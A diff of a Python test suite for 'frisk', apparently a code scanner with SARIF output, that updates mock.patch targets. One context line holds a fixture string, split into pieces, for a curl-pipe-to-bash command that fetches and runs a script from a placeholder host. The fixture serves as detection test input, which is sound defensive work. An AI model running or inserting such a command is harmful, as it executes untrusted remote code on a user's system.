@@ -28,7 +28,7 @@ INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
 
 def cli(argv: list[str]) -> str:
     out = io.StringIO()
-    with mock.patch("frisk.report._USE_COLOR", False), contextlib.redirect_stdout(out):
+    with mock.patch("frisk.report.use_color", return_value=False), contextlib.redirect_stdout(out):
         main(argv)
     return out.getvalue()
 
@@ -190,7 +190,7 @@ class TestTargetKinds(unittest.TestCase):
             def fake(target: str) -> Iterator[tuple[Path, str]]:
                 yield Path(d), target
 
-            with mock.patch("frisk.cli.materialize", fake), \
+            with mock.patch("frisk.engine.materialize", fake), \
                     mock.patch("frisk.sources.subprocess.run", side_effect=AssertionError("network")):
                 doc = sarif([url])
         loc = doc["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]
